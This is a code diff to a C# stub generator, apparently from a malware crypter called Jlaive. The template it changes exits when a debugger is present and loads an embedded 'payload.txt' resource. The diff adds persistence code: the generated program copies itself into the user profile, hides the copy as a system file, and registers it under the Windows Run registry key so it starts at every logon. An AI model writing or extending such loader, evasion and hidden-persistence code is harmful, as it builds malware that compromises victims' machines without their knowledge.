@@ -1,5 +1,4 @@
 ﻿using System;
-using System.IO;
 using System.Text;
 
 using static Jlaive.Utils;
@@ -44,6 +43,7 @@ using System.Runtime.InteropServices;
 using System.IO;
 using System.IO.Compression;
 using System.Security.Cryptography;
+using Microsoft.Win32;
 
 namespace " + namespacename + @"
 {
@@ -89,14 +89,15 @@ if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(
             " + (startup ?
             @"string filepath = Path.ChangeExtension(Process.GetCurrentProcess().MainModule.FileName, null);
             string filecontent = File.ReadAllText(filepath);
-            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + ""\\"" + Path.GetFileName(filepath);
+            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + ""\\"" + Path.GetFileName(filepath);
             if (File.Exists(startuppath))
             {
                 File.SetAttributes(startuppath, FileAttributes.Normal);
                 File.Delete(startuppath);
             }
             File.WriteAllText(startuppath, filecontent);
-            File.SetAttributes(startuppath, FileAttributes.System | FileAttributes.Hidden);" : string.Empty) + @"
+            File.SetAttributes(startuppath, FileAttributes.Hidden | FileAttributes.System);
+            Registry.SetValue(@""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"", Path.GetFileName(startuppath), ""cmd /c \"""" + startuppath + ""\"""");" : string.Empty) + @"
 
             Assembly asm = Assembly.GetExecutingAssembly();
             StreamReader reader = new StreamReader(asm.GetManifestResourceStream(""payload.txt""));
